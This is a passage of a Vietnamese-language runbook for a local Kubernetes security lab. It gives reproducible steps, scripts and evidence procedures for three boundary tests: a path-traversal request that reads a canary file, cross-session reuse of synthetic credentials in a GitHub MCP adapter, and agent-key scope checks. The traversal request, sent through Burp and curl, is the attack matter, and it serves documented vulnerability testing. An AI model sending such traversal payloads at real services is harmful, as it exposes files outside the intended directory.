# Lab v3 — hướng dẫn thao tác và chứng minh ba ranh giới

Tài liệu này là kịch bản thao tác cho **một** môi trường đang chạy:
namespace Kubernetes **ai-cve-lab-exposed**. Đặc tả chính thức về Campaign,
Run ID, source/build lock và điều kiện chấp nhận evidence nằm tại
[`chapter-3-final-experiment-plan.md`](chapter-3-final-experiment-plan.md).
Khi chạy để lấy artifact cho **báo cáo chính thức**, bắt đầu từ lịch chạy chung
ở Mục 0.2, rồi làm đúng phần `B`, `N`, `G3`, `P` tương ứng bên dưới. Tài liệu
[`lab-v3-official-report-runbook.md`](lab-v3-official-report-runbook.md) là
bản tóm tắt/đối chiếu evidence; không chạy tuần tự mọi lệnh reset trong file
đó khi đã theo lịch chung này.
Mỗi phần luôn làm theo thứ tự:

1. Chụp chức năng hợp lệ trên UI hoặc endpoint công khai.
2. Gửi đúng request kiểm tra tới đầu vào không có trên UI.
3. Lưu phản hồi, bản ghi runtime và scope Kubernetes thành các bằng chứng
   tách biệt.

Mục tiêu là chứng minh chính xác một ranh giới bị vi phạm trong lab cục bộ;
không suy rộng thành quyền trên node, Docker Desktop, API Kubernetes hoặc hệ
thống bên ngoài.

## 0. Chuẩn bị chung

### 0.1. Khởi động một lần

Mở PowerShell tại thư mục gốc của lab và chạy:

~~~powershell
Set-Location D:\daihoc\Nam4\Doan\lab
.\scripts\90-start-ai-cve-lab.ps1
~~~

Chỉ tiếp tục khi cuối output có đủ các URL dưới đây:

| Thành phần | URL dùng trên trình duyệt | Vai trò |
|---|---|---|
| Beifong boundary model | http://127.0.0.1:19091/ | UI và route audio |
| GitHub MCP Agent adapter | http://127.0.0.1:19501/ | hai phiên Streamlit |
| GitHub credential sink | http://127.0.0.1:19580/events | bằng chứng hash-only |
| Paperclip v0.3.1 | http://127.0.0.1:19310/ | UI quản trị, Agent API key và runs |

Nếu URL không mở được, chạy lại đúng lệnh trên. Không tự tạo port-forward
bằng lệnh khác trong khi script đang quản lý các tiến trình pf-ai-cve-*.

Khi bắt đầu một campaign chính thức theo Mục 0.2, **bỏ qua lệnh `90-start`
ở trên và chạy `93-reset-active-lab.ps1`**. Script 93 tự gọi 90 sau reset;
không chạy cả hai lệnh liên tiếp nếu không có lỗi port-forward.

### 0.2. Lịch chạy chung — giảm reset nhưng vẫn giữ evidence độc lập

Không reset chỉ vì chuyển sang một Run ID mới. Một lần reset tạo một **deployment
epoch** mới; Run không được kéo dài qua reset/Pod restart, nhưng nhiều Run chỉ
đọc hoặc không làm thay đổi trạng thái liên quan có thể dùng cùng epoch. Lịch
core dưới đây chỉ cần **hai lần reset**:

1. Reset lần A: Beifong → NetworkPolicy → GitHub G3.
2. Reset lần B: Paperclip L1/L2.

Các script capture boundary (`41`, `42`, `43`, `44`) vẫn chạy riêng tại từng
case; phần này chỉ tạo môi trường và baseline chung, không thay chúng. Mở một
PowerShell, giữ nguyên cửa sổ đó trong toàn bộ Phase A:

~~~powershell
Set-Location D:\daihoc\Nam4\Doan\lab
$Campaign = 'CH3-20261015'

# Reset A: chỉ chạy một lần trước Beifong.
.\scripts\93-reset-active-lab.ps1

# Baseline của Run Beifong. Sau đó làm toàn bộ B2–B6 ở Mục 1.
$Run = 'CH3-BEIFONG-002'
.\scripts\94-capture-ch3-run-state.ps1 `
  -CampaignId $Campaign -RunId $Run `
  -Checkpoint baseline -RequireClean
~~~

Sau Beifong, không reset. Request Beifong và script 41 chỉ quan sát tài
nguyên, không tạo Company, marker hay sink event. Vì vậy tiếp tục NetworkPolicy
rồi GitHub G3 trong cùng epoch:

~~~powershell
# Làm các bước N2–N4 ở Mục 4 sau baseline này.
$Run = 'CH3-NETPOL-002'
.\scripts\94-capture-ch3-run-state.ps1 `
  -CampaignId $Campaign -RunId $Run `
  -Checkpoint baseline -RequireClean

# Sau khi NetworkPolicy hoàn tất, làm G3-2 đến G3-8 ở Mục 2.
$Run = 'CH3-G3-002'
.\scripts\94-capture-ch3-run-state.ps1 `
  -CampaignId $Campaign -RunId $Run `
  -Checkpoint baseline -RequireClean
~~~

`43-test-github-mcp-networkpolicy.ps1` chỉ gửi GET nội bộ, nên không tạo sink
event; vì vậy G3 vẫn có thể dùng `-RequireClean`. Nếu một lệnh
`-RequireClean` báo state không sạch, **không bỏ qua lỗi và không ghép
evidence**: reset ngay lúc đó, tạo Run ID mới cho case đang làm, rồi tiếp tục
theo thứ tự từ case đó.

Sau G3 có event sink nên không thể dùng baseline global sạch cho Paperclip.
Lúc này mới thực hiện reset lần B, sau đó làm P2–P11 ở Mục 3:

~~~powershell
$Run = 'CH3-PAPERCLIP-L2-002'
.\scripts\93-reset-active-lab.ps1
.\scripts\94-capture-ch3-run-state.ps1 `
  -CampaignId $Campaign -RunId $Run `
  -Checkpoint baseline -RequireClean
~~~

G1, G2, G4 là đối chứng GitHub tùy chọn. Mỗi đối chứng cần process/sink sạch
riêng, nên chỉ khi quyết định thực hiện chúng mới reset thêm một lần theo Mục
0.3. Không chạy G1/G2/G4 chen giữa T0 và T2 của Paperclip.

### 0.3. Reset khi một case thực sự cần trạng thái mới

Mỗi lần reset toàn namespace bắt đầu một deployment epoch mới. Không reset
giữa các bước của cùng run. Trước run đầu tiên của Campaign, đã rebuild/redeploy
source nếu có sửa code; không rebuild lại trong khi run đang diễn ra.

Ví dụ tạo một Run bổ sung sau khi Phase A/Phase B đã kết thúc:

~~~powershell
Set-Location D:\daihoc\Nam4\Doan\lab
$Campaign = 'CH3-20261015'
$Run = 'CH3-G4-001'

# Reset runtime v3, tự khởi động lại port-forward, rồi kiểm tra trạng thái sạch.
.\scripts\93-reset-active-lab.ps1

# Chỉ tiếp tục nếu script reset in 0 company, 0 sink event, MARKER_ABSENT.
.\scripts\94-capture-ch3-run-state.ps1 `
  -CampaignId $Campaign `
  -RunId $Run `
  -Checkpoint baseline `
  -RequireClean
~~~

`93-reset-active-lab.ps1` là lệnh **reset rồi tự khởi động lại lab**, không
chỉ là lệnh xóa Pod. Một lượt chạy thành công thực hiện theo đúng thứ tự sau:

1. Kiểm tra Docker context, start/khôi phục profile `ai-cve-lab` và kubecontext.
2. Xóa rồi apply lại namespace `ai-cve-lab-exposed` từ `k8s\exposed`.
3. Chờ bốn Deployment `beifong-exposed`, `github-mcp-exposed`,
   `github-credential-sink`, `paperclip-exposed` hoàn tất rollout.
4. Tự gọi `90-start-ai-cve-lab.ps1` để tạo lại các port-forward `19091`,
   `19501`, `19310` và `19580`.
5. Chờ API Paperclip sẵn sàng qua cả `/api/health` và `/api/companies`. Bước
   này cần thiết vì Nginx có thể đã mở port `19310` trong khi Paperclip vẫn
   đang khởi tạo PostgreSQL/migration; script tự retry tối đa 120 giây thay vì
   coi `502 Bad Gateway` tạm thời là reset thất bại.
6. Kiểm tra runtime sạch: `credentialSinkEventCount = 0`,
   `paperclipCompanyCount = 0` và `paperclipMarker = MARKER_ABSENT`.

Vì bước 4 đã gọi `90-start`, **không chạy lại `90-start` sau một reset thành
công**. Chỉ chạy riêng `90-start` khi reset báo namespace đã sẵn sàng nhưng
thất bại đúng ở bước port-forward. Nếu reset hết thời hạn 120 giây khi chờ
Paperclip API, chưa bắt đầu một case hay tạo Company; kiểm tra Docker Desktop
đang chạy rồi chạy lại đúng `93-reset-active-lab.ps1`. Sau reset, mở đúng
`http://127.0.0.1:19310/`, nhấn `Ctrl+F5` và phải thấy wizard
**Company / Agent / Task / Launch**.

Reset xóa Company, Project, Agent, Issue, Run, Agent API key, marker, trạng
thái process GitHub MCP và sink event trong namespace active. Nó **không** xóa
source, image đã build, manifest, profile Minikube, evidence trong
`evidence\campaigns`, hoặc Paperclip khác ở port `3100`. Mặc định nó chỉ dọn
direct file tạm trong `evidence\boundary-v3`; không dùng thư mục này làm
evidence chính thức.

Không dùng `-RebuildImages` cho reset thường. Chỉ thêm switch đó sau khi đã
sửa source/Dockerfile và muốn build lại image trước lượt đo mới.

### 0.4. Evidence theo Run ID

Không lưu JSON mới/cũ lẫn trong `evidence\boundary-v3`. Mỗi run ghi vào:

~~~text
evidence\campaigns\<CampaignId>\<RunId>\
~~~

| Mục đích | Script | Ví dụ output trong Run ID |
|---|---|---|
| baseline/checkpoint runtime | `94-capture-ch3-run-state.ps1` | `runtime-baseline.json`, `runtime-after-a.json` |
| Beifong Pod/file scope | `41-capture-beifong-k8s-boundary.ps1` | `k8s\beifong-k8s-boundary.json` |
| GitHub MCP/sink/policy | `42-capture-github-mcp-k8s-boundary.ps1` | `k8s\github-mcp-k8s-boundary.json` |
| Paperclip marker T0/T1/T2 | `44-check-paperclip-scope-marker.ps1` | `k8s\paperclip-marker-T0.json` |
| integrity seal | `95-seal-ch3-run-evidence.ps1` | `run-seal.json` |

Sau khi lưu đủ JSON và ảnh/Burp export **đã che Bearer key**, chạy:

~~~powershell
.\scripts\95-seal-ch3-run-evidence.ps1 `
  -CampaignId $Campaign `
  -RunId $Run `
  -ArtifactPath C:\duong-dan\anh-da-che-key.png
~~~

Script seal tạo SHA-256 cho mọi artifact và từ chối text evidence có Bearer
credential/Paperclip key thô. Không thay file trong run sau khi đã seal; nếu
cần đo lại, dùng Run ID mới.

### 0.5. Checklist chốt evidence cho báo cáo chính thức

Mỗi Run ID chỉ được đưa vào báo cáo chính thức khi kiểm tra đủ các mục sau:

| Thời điểm | Việc phải làm | File/kết quả phải có |
|---|---|---|
| ngay sau reset | capture baseline với `-RequireClean` | `runtime-baseline.json` cùng Run ID |
| trong lúc đo | lưu request/response hoặc ảnh đã che credential | artifact chứa Campaign ID/Run ID hoặc định danh run/event |
| cuối run | capture scope/checkpoint theo case | JSON trong thư mục `k8s\` của Run ID |
| trước khi kết luận | kiểm tra điều kiện dương và âm của case | không dùng một HTTP status hay UI screenshot đơn lẻ |
| sau khi che key | chạy `95-seal-ch3-run-evidence.ps1` | `run-seal.json` và SHA-256 của mọi file |

`95-seal-ch3-run-evidence.ps1` không cần ảnh để chạy. Ví dụ, nếu Run đã có
JSON đầy đủ và không có artifact bổ sung thì dùng:

~~~powershell
.\scripts\95-seal-ch3-run-evidence.ps1 `
  -CampaignId $Campaign `
  -RunId $Run
~~~

Nếu cần kèm ảnh hoặc Burp export, che toàn bộ giá trị sau `Authorization:
Bearer ` và mọi chuỗi `pcp_...` trước, rồi mới thêm từng file bằng
`-ArtifactPath`. Không tạo seal cho một Run đang tiếp tục đo; khi đã seal,
không sửa hay thêm artifact vào Run đó.

### 0.6. Trạng thái evidence hiện có và cách viết báo cáo

Bảng này giúp phân biệt **điều đã quan sát** với **điều còn thiếu**. Không
chạy lại một case chỉ để có kết quả đẹp hơn; chỉ bổ sung đúng bằng chứng còn
thiếu nếu muốn nâng mức kết luận.

| Case | Trạng thái có thể trình bày hiện nay | Không được ghi quá mức | Muốn chốt mức cao hơn cần có |
|---|---|---|---|
| Beifong | Bản lab đã đọc canary và inventory xác định canary thuộc scope filesystem Pod. Build lab có điều chỉnh route, nên đây là kết quả của build lab đã khóa. | Không gọi đó là khai thác HTTP end-to-end trên upstream nguyên trạng; không suy ra host/node/cluster access. | Giữ source/build lock, request/response canary và inventory cùng Run ID. |
| GitHub MCP | `CH3-G3-001` có A/B và sink event cho thấy B để trống token dùng fingerprint A qua `process-global os.environ fallback` trong cùng adapter process. | Không suy ra GitHub, OpenAI hay MCP server thật nhận credential. Không dùng G3 để khẳng định toàn bộ G1–G4 đã hoàn thành. | Với baseline sạch hoặc đối chứng G1/G2/G4: tạo **Run ID mới**, reset + baseline rồi đo; không tạo baseline muộn vào Run G3 cũ. |
| Paperclip | Có đối chứng B self/cross, A PATCH, T0/T1 false và T2 true. Đây là bằng chứng cấu hình/marker đáng giá. | Chưa chốt toàn bộ chuỗi end-to-end hay provisioning chỉ từ `202`/T2 nếu chưa có final run status và log tương ứng. | Lưu final status, run ID, log provisioning/workspace và đối chiếu chúng với T2 trong cùng Run/Pod. |
| NetworkPolicy | `CH3-NETPOL-001` đo được selected GitHub Pod vẫn kết nối Beifong ngoài allow-list, trong khi sink và control đều truy cập được. | Không kết luận policy chặn egress đang được cưỡng chế. | Không bắt buộc chạy lại; báo cáo đúng là policy được khai báo nhưng enforcement chưa được xác nhận ở runtime. |

Với Campaign `CH3-20261014`, các Run hiện có chưa có `run-seal.json`. Chỉ seal
một Run khi toàn bộ JSON/artifact của chính Run đó đã được kiểm tra và che
credential. Nếu cần bổ sung Paperclip hoặc G3, dùng Run ID mới thay vì ghép
evidence có thời điểm/Pod khác nhau.

### 0.7. Giá trị dữ liệu được phép dùng

Chỉ nhập các chuỗi giả lập sau. Chúng không phải OpenAI key hay GitHub token
thật và các image lab từ chối mọi giá trị không có tiền tố LAB_.

| Giá trị | Nhập tại đâu | Mục đích |
|---|---|---|
| LAB_OPENAI_A_20261007 | GitHub MCP, phiên A, OpenAI API Key | nhãn của requester A |
| LAB_GITHUB_A_20261007 | GitHub MCP, phiên A, GitHub Token | credential thuộc A |
| LAB_OPENAI_B_20261007 | GitHub MCP, phiên B, OpenAI API Key | nhãn của requester B |
| để trống | GitHub MCP, phiên B, GitHub Token | buộc app dùng trạng thái process-global còn lại |
| Ch3 Boundary Lab | Paperclip Company | tên công ty lab |
| Ch3 Agent-key workspace evidence | Paperclip Project | tên project lab |
| Ch3 Agent key scope | Paperclip Agent | tên agent lab |

Agent API key được Paperclip sinh ra là credential cục bộ có hiệu lực. Có thể
copy nó vào Burp Repeater để chạy PoC, nhưng không đặt nguyên giá trị vào ảnh,
Markdown, file evidence hay báo cáo. Sau khi hoàn tất, revoke key trong chính
trang Agent > Configuration > API Keys.

### 0.8. Thiết lập Burp Suite để ghi request

Burp chỉ cần cho Beifong và Paperclip. GitHub MCP có đủ trường input trên UI.

1. Mở Burp Suite.
2. Chọn **Proxy** > **Proxy settings**. Kiểm tra listener
   **127.0.0.1:8080** đang bật.
3. Cấu hình proxy của trình duyệt thử nghiệm thành HTTP proxy
   **127.0.0.1**, port **8080**. Không dùng proxy này cho các tab đăng nhập
   hoặc tài khoản thật.
4. Trở lại Burp, chọn **Proxy** > **Intercept** và để **Intercept is off**.
   Mục đích là UI chạy bình thường nhưng request vẫn xuất hiện ở
   **Proxy** > **HTTP history**.
5. Ở HTTP history, lọc host **127.0.0.1** và port tương ứng. Khi cần sửa
   request, nhấp phải request rồi chọn **Send to Repeater**.

Trong ảnh chụp Repeater, phải nhìn thấy request-target, HTTP status và body.
Không chụp header Authorization có Agent API key.

## 1. Beifong — ranh giới vùng audio và file ngoài phạm vi

### 1.0. Một lượt Beifong hoàn chỉnh để dùng trong báo cáo (B1–B6)

Làm toàn bộ sáu bước dưới đây theo thứ tự trong **một Run ID mới**. Không dùng
lại `CH3-BEIFONG-001` nếu thư mục đó đã có JSON/ảnh: baseline phải được tạo
trước request HTTP và cùng trạng thái Pod với inventory cuối.

**B1 — dùng reset/baseline Phase A ở Mục 0.2.** Đây là reset chung đầu tiên;
không chạy lại `93-reset-active-lab.ps1` trong mục này nếu vừa thực hiện Phase
A. Biến phải đang là `$Campaign = 'CH3-20261015'` và
`$Run = 'CH3-BEIFONG-002'`; file
`evidence\campaigns\$Campaign\$Run\runtime-baseline.json` phải tồn tại trước
khi làm B2. Chỉ tiếp tục khi output reset đã có `credentialSinkEventCount : 0`,
`paperclipCompanyCount : 0` và `paperclipMarker : MARKER_ABSENT`.

**B2 — chứng minh chức năng hợp lệ.** Mở `http://127.0.0.1:19091/` qua
Chrome đã cấu hình Burp, vào **Podcasts**, bấm **ba chấm > Download** của
player. Trong HTTP history đưa request `/stream-audio/<audio-file>` sang
Repeater, gửi lại và chụp response `200` có `Content-Type: audio/wav`. Đây là
**Hình Beifong-B**. Lấy đúng tên audio từ request UI của lượt hiện tại; không
tự thay bằng một tên fixture khác.

**B3 — kiểm tra canary an toàn.** Duplicate request B2 trong Repeater, thay
đúng request-target, rồi gửi:

~~~http
GET /stream-audio/../../../var/run/lab-canary/beifong-outside-audio.txt HTTP/1.1
Host: 127.0.0.1:19091
Accept: */*
Connection: close
~~~

Nếu Burp chuẩn hóa `../`, dùng lệnh dưới đây thay cho Burp để lưu evidence:

~~~powershell
curl.exe --path-as-is -i "http://127.0.0.1:19091/stream-audio/../../../var/run/lab-canary/beifong-outside-audio.txt"
~~~

Kết quả đạt là HTTP `200` cùng nhãn
`LAB_CANARY_BEIFONG_OUTSIDE_AUDIO_NOT_A_REAL_SECRET`. Chụp request/response
làm **Hình Beifong-C**. Chỉ nhãn canary vô hại được phép xuất hiện trong ảnh.

**B4 — chụp ranh giới Kubernetes của chính Run này.** Ngay sau B3, không
reset/redeploy Pod, chạy:

~~~powershell
.\scripts\41-capture-beifong-k8s-boundary.ps1 `
  -CampaignId $Campaign -RunId $Run `
  -Checkpoint final `
  -EvidenceRoot ".\evidence\campaigns\$Campaign\$Run\k8s"
~~~

Mở `k8s\beifong-k8s-boundary.json`; chụp `intendedBusinessDirectory`,
`canaryPath`, `mountReadOnly`, `volumeType` và `processCanReadCanary` làm
**Hình Beifong-D**. JSON không chứa nội dung canary.

**B5 — kiểm tra tính liên kết evidence.** Trong cùng Run phải có tối thiểu:

~~~text
runtime-baseline.json
k8s\beifong-k8s-boundary.json
~~~

Pod UID, image ID và restart count trong inventory phải thuộc Pod đang chạy;
nếu Pod restart hoặc bạn đã reset giữa B1 và B4, bỏ Run này và lặp lại với Run
ID mới.

**B6 — che thông tin không cần thiết và seal.** Lưu ảnh B2/B3 đã che cookie,
đường dẫn máy cá nhân và dữ liệu không liên quan vào một thư mục tạm, sau đó:

~~~powershell
.\scripts\95-seal-ch3-run-evidence.ps1 `
  -CampaignId $Campaign -RunId $Run `
  -ArtifactPath C:\evidence-redacted\beifong-valid.png,C:\evidence-redacted\beifong-canary.png
~~~

Kết quả cuối phải có `run-seal.json`. Chỉ sau B1–B6 mới gọi Run là evidence
chính thức. Câu kết luận được phép dùng nằm ở Mục 1.5.

### 1.1. Điều cần chứng minh

Business path được phép là đọc file audio demo dưới vùng
podcasts/audio. Đầu vào `filename:path` đi tới thao tác đọc file. Image lab
boundary model dùng canary vô hại để kiểm tra liệu request có thể vượt ra ngoài
vùng audio trong **cùng Pod** hay không.

Trước run Beifong đầu tiên, `campaign-baseline.json` phải đã ghi source commit,
Git status, hash `beifong/main.py`, Dockerfile và image identity. Caption chỉ
được gọi đây là hành vi của build/model đã được khóa trong Campaign; source
diff quyết định mức tương đương có thể kết luận.

Canary duy nhất là:

~~~
/var/run/lab-canary/beifong-outside-audio.txt
~~~

Nó chứa nhãn LAB_CANARY_BEIFONG_OUTSIDE_AUDIO_NOT_A_REAL_SECRET, không phải
secret thật.

### 1.2. Thao tác UI: chụp ngữ cảnh nghiệp vụ

1. Mở http://127.0.0.1:19091/ trong trình duyệt.
2. Trên thanh điều hướng, nhấp **Podcasts**.
3. Nếu có card podcast/demo audio, mở card đó và chụp trang player.
4. Nếu trang hiện **No podcasts found**, vẫn chụp trang này cùng thanh điều
   hướng và URL. Seed của lab bảo đảm route audio demo, không bắt buộc seed
   catalogue podcast cho UI; đây không phải lỗi PoC.

Ảnh này chỉ chứng minh UI của ứng dụng và bối cảnh podcast. Không dùng nó làm
bằng chứng traversal.

### 1.3. Thao tác hợp lệ trên UI: tải audio podcast

Filename business path phải lấy từ request thực tế của UI đang chạy. Ở image
hiện tại, player thường dùng `demo-podcast.wav`; không ghi cứng tên đó nếu HTTP
history của run hiện tại cho tên khác. `demo-audio.txt` chỉ là fixture health
dạng text, không phải file gắn với player.

1. Ở trang chi tiết podcast, nhìn thanh player có nút Play ở bên trái và
   biểu tượng **ba chấm dọc** ở bên phải.
2. Nhấp **ba chấm dọc** của player, sau đó chọn **Download** hoặc
   **Tải xuống**. Trong Burp, lấy request vừa phát sinh, ví dụ:

   ~~~http
   GET /stream-audio/demo-podcast.wav HTTP/1.1
   Host: 127.0.0.1:19091
   ~~~

3. Vào Burp > **Proxy** > **HTTP history**, chọn request
   `/stream-audio/<audio-file>` vừa xuất hiện, nhấp phải >
   **Send to Repeater**.
4. Trong Repeater nhấn **Send**. Response hợp lệ là 200 với Content-Type
   audio/wav. Body là WAV nhị phân nên ảnh chụp Headers/Raw request-response
   là đủ; không cần hiển thị nội dung file.
5. Nhấn nút **Play** cũng có thể khiến browser fetch audio để phát; request
   đó có thể mang header Range và tùy hành vi preload của browser. Vì vậy,
   để chụp một business request ổn định cho báo cáo, dùng **ba chấm >
   Download**.
Burp Repeater của request demo-podcast.wav là evidence business path chính.
Không tạo JSON HTTP riêng cho Beifong; JSON duy nhất của case này chỉ dùng để
ghi nhận ranh giới Kubernetes ở bước 1.4.

### 1.4. Thao tác PoC an toàn: kiểm tra traversal tới canary

Không có ô tìm file hoặc ô filename trên UI Beifong. Vì vậy không thể nhập
payload này bằng cách nhấp trong UI; Burp Repeater hoặc cURL là đúng lớp thao
tác vì chúng kiểm soát trực tiếp request-target.

1. Trong Repeater, duplicate request đối chứng.
2. Chỉ đổi dòng đầu tiên thành:

~~~http
GET /stream-audio/../../../var/run/lab-canary/beifong-outside-audio.txt HTTP/1.1
Host: 127.0.0.1:19091
Accept: */*
Connection: close
~~~

3. Nhấn **Send** và chụp response. Nếu Burp tự chuẩn hóa chuỗi ../, không
   kết luận từ response đó; dùng lệnh cURL ở bước 4 để gửi nguyên path.
4. Trong PowerShell chạy:

~~~powershell
Set-Location D:\daihoc\Nam4\Doan\lab
curl.exe --path-as-is -i "http://127.0.0.1:19091/stream-audio/../../../var/run/lab-canary/beifong-outside-audio.txt"
~~~

5. Kết quả thành công của **boundary model** là HTTP 200 và body có
   LAB_CANARY_BEIFONG_OUTSIDE_AUDIO_NOT_A_REAL_SECRET.
6. Sau khi chụp request/response trong Burp, chạy script chỉ ghi nhận
   filesystem/volume boundary của Pod Beifong:

~~~powershell
.\scripts\41-capture-beifong-k8s-boundary.ps1 `
  -CampaignId $Campaign -RunId $Run `
  -Checkpoint final `
  -EvidenceRoot ".\evidence\campaigns\$Campaign\$Run\k8s"
~~~

File JSON của run Beifong là:

~~~
evidence\campaigns\<CampaignId>\<RunId>\k8s\beifong-k8s-boundary.json
~~~

Trong ảnh Beifong-D, dùng các trường `intendedBusinessDirectory`,
`mountedDirectory`, `mountReadOnly` và `processCanReadCanary`. Các trường này
chỉ xác định filesystem mà process trong Pod nhìn thấy; request/response ở
Burp mới là evidence cho việc input HTTP có vượt vùng audio hay không.

### 1.5. Ảnh cần đưa vào báo cáo

1. **Hình Beifong-A:** trang Podcasts/player hoặc trang Podcasts rỗng, có
   URL port 19091 — ngữ cảnh nghiệp vụ.
2. **Hình Beifong-B:** Repeater của request `/stream-audio/<audio-file>` vừa
   lấy từ UI trả 200 và
   Content-Type audio/wav —
   chức năng hợp lệ.
3. **Hình Beifong-C:** Repeater hoặc terminal cURL của canary trả 200 và
   nhãn LAB_CANARY — vượt ranh giới vùng audio trong Pod.
4. **Hình Beifong-D:** phần canaryVolumeBoundary trong
   beifong-k8s-boundary.json cho thấy mount canary read-only —
   phạm vi Kubernetes làm rõ process nhìn thấy gì.

Caption phải ghi Campaign/Run ID và gọi đúng đây là **Beifong boundary model
trong lab**. Không suy rộng từ response/mount sang host, node, Kubernetes API
hay một build không nằm trong source/build lock của Campaign.

## 2. GitHub MCP Agent — kiểm soát state qua G1–G4

### 2.0. Quy trình đầy đủ theo từng Run (G1–G4)

Mỗi G1, G2, G3 và G4 là **một Run ID riêng**. G3 dùng Phase A ở Mục 0.2 nên
không reset lại sau Beifong/NetworkPolicy; lúc bắt đầu G3, sink vẫn phải rỗng,
Paperclip chưa được tạo và marker vẫn absent. G1/G2/G4 là đối chứng tùy chọn,
mỗi case đó mới cần reset riêng theo Mục 0.3 để tạo process/sink mới. Riêng
hai thao tác A/B bên trong G3 phải diễn ra liên tiếp trong **một** Pod/process,
tuyệt đối không reset, redeploy hay refresh làm container restart giữa A và B.
Chỉ dùng các chuỗi `LAB_*`; không nhập credential thật.

#### G1 — đối chứng A hợp lệ

~~~powershell
Set-Location D:\daihoc\Nam4\Doan\lab
$Campaign = 'CH3-20261015'
$Run = 'CH3-G1-001'
.\scripts\93-reset-active-lab.ps1
.\scripts\94-capture-ch3-run-state.ps1 `
  -CampaignId $Campaign -RunId $Run -Checkpoint baseline -RequireClean
~~~

Mở `http://127.0.0.1:19501/` trong cửa sổ Chrome thường; nhập
`LAB_OPENAI_A_20261007` và `LAB_GITHUB_A_20261007`, giữ repository
`lab/example-repository` và query `List the safe lab fixture result`, rồi bấm
**Run Query**. Chụp JSON có `requesterSession: A`, `credentialOwner: A`,
`credentialSource: session input`. Mở `http://127.0.0.1:19580/events` để
xác nhận event hash-only tương ứng, chạy script 42 với `$Campaign/$Run`, rồi
seal ảnh đã che thông tin không liên quan và JSON của run.

#### G2 — đối chứng B hợp lệ

Lặp lại đúng block reset/baseline G1 nhưng đổi `$Run = 'CH3-G2-001'`. Mở cửa
sổ ẩn danh; nhập `LAB_OPENAI_B_20261007` và `LAB_GITHUB_B_20261007`; bấm
**Run Query**. Kết quả đạt: requester/owner đều là B, source là `session
input`, sink nhận fingerprint B. Sau đó chạy script 42 với Run G2 và seal.

#### G3 — case chính: A ghi state, B không nhập GitHub token

1. Dùng state sạch Phase A và tạo baseline G3 (không reset lần nữa):

   ~~~powershell
   $Campaign = 'CH3-20261015'
   $Run = 'CH3-G3-002'
   .\scripts\94-capture-ch3-run-state.ps1 `
     -CampaignId $Campaign -RunId $Run -Checkpoint baseline -RequireClean
   ~~~

2. Ở cửa sổ Chrome thường (phiên A), nhập `LAB_OPENAI_A_20261007` và
   `LAB_GITHUB_A_20261007`, giữ repository/query mặc định nêu ở G1, bấm
   **Run Query**. Chụp JSON A.
3. Ngay sau A, ghi identity process:

   ~~~powershell
   .\scripts\94-capture-ch3-run-state.ps1 `
     -CampaignId $Campaign -RunId $Run -Checkpoint after-a
   ~~~

4. Mở **cửa sổ ẩn danh mới** (Ctrl+Shift+N), truy cập cùng URL. Nhập
   `LAB_OPENAI_B_20261007`; để **trống hoàn toàn** `GitHub Token`; giữ cùng
   repository/query và bấm **Run Query**. Chụp JSON B.
5. Kết quả đạt của B đồng thời phải có `requesterSession: B`,
   `credentialOwner: A`, `credentialSource: process-global os.environ
   fallback`, và `crossSessionCredentialUse: true`.
6. Ghi checkpoint sau B, mở sink, rồi thu inventory:

   ~~~powershell
   .\scripts\94-capture-ch3-run-state.ps1 `
     -CampaignId $Campaign -RunId $Run -Checkpoint after-b

   .\scripts\42-capture-github-mcp-k8s-boundary.ps1 `
     -CampaignId $Campaign -RunId $Run -Checkpoint final `
     -EvidenceRoot ".\evidence\campaigns\$Campaign\$Run\k8s"
   ~~~

7. Trong `http://127.0.0.1:19580/events`, hai event phải cho thấy B dùng
   fingerprint bằng A, nhưng không hiện token thô. `runtime-baseline.json`,
   `runtime-after-a.json`, `runtime-after-b.json` phải giữ nguyên Pod UID,
   container ID, restart count và Python PID/start ticks.
8. Che ảnh UI/sink, rồi seal:

   ~~~powershell
   .\scripts\95-seal-ch3-run-evidence.ps1 `
     -CampaignId $Campaign -RunId $Run `
     -ArtifactPath C:\evidence-redacted\github-a.png,C:\evidence-redacted\github-b.png,C:\evidence-redacted\github-sink.png
   ~~~

#### G4 — đối chứng không có state A tồn dư

Lặp lại reset/baseline với `$Run = 'CH3-G4-001'`. Trước khi A thực hiện bất cứ
thao tác nào, mở sink và xác nhận `count: 0`; trong cửa sổ ẩn danh B chỉ nhập
`LAB_OPENAI_B_20261007`, để trống GitHub Token, rồi bấm **Run Query**. Không
được có event/fingerprint owner A. Validation hoặc không có event chỉ là kết
quả âm tính hợp lệ khi endpoint sink vẫn mở được. Chạy script 42, lưu ảnh và
seal như G3.

Kết luận chính thức chỉ được viết cho adapter khi G3 có đủ B blank, fallback
source, fingerprint A=B, event sink và process identity không đổi. G1/G2/G4
là các đối chứng làm kết luận đó mạnh hơn; không được gọi bất kỳ kết quả nào
là một cuộc gọi GitHub/OpenAI/MCP thật.

### 2.1. Quy tắc G1–G4 và phạm vi kết luận

Adapter chỉ dùng credential `LAB_*`, giữ cơ chế process-global trong lab và
gửi fingerprint hash-only tới sink cục bộ. Nó không gọi GitHub, OpenAI, Docker
hay MCP server thật. Kết luận chỉ nói về credential reuse của adapter trong
cùng process.

Mỗi hàng là một Run ID mới. G3 dùng epoch chung ở Mục 0.2; các đối chứng G1,
G2, G4 dùng reset riêng theo Mục 0.3. A/B bên trong G3 phải giữ cùng
Pod/container/PID 1 và không reset/restart giữa hai thao tác.

| Run | Điều kiện đầu | Mục tiêu |
|---|---|---|
| G1 | clean process | A nhập A; sink nhận owner A, source session input |
| G2 | clean process | B nhập B; sink nhận owner B, source session input |
| G3 | clean process, A rồi B liên tục | B blank kiểm tra reuse A |
| G4 | clean process/sink, B chạy trước | loại trừ fingerprint A tồn dư |

G1/G2 dùng các bước UI ở 2.2 với credential tương ứng, nhưng mỗi lượt phải
reset/baseline riêng. Mục 2.2–2.4 chi tiết G3; Mục 2.5 là G4 và điều kiện
kết luận.

### 2.2. G1/G2 và bước A của G3

1. Dùng **cửa sổ Chrome bình thường**, mở
   http://127.0.0.1:19501/.
2. Ở sidebar **Synthetic lab credentials**, nhấp ô **OpenAI API Key** và
   nhập:

   ~~~
   LAB_OPENAI_A_20261007
   ~~~

3. Nhấp ô **GitHub Token** và nhập:

   ~~~
   LAB_GITHUB_A_20261007
   ~~~

4. Ở vùng chính, giữ:
   - **Repository:** lab/example-repository
   - **Your Query:** List the safe lab fixture result
5. Nhấn nút đỏ **Run Query**.
6. Chụp phần JSON kết quả. Record của A phải thể hiện:
   - requesterSession là A;
   - credentialOwner là A;
   - credentialSource là session input;
   - chỉ có credentialSha256_20, không có raw token.

Trong `CH3-G1-001`, dừng ở đây rồi capture/seal run. Trong `CH3-G2-001`, làm
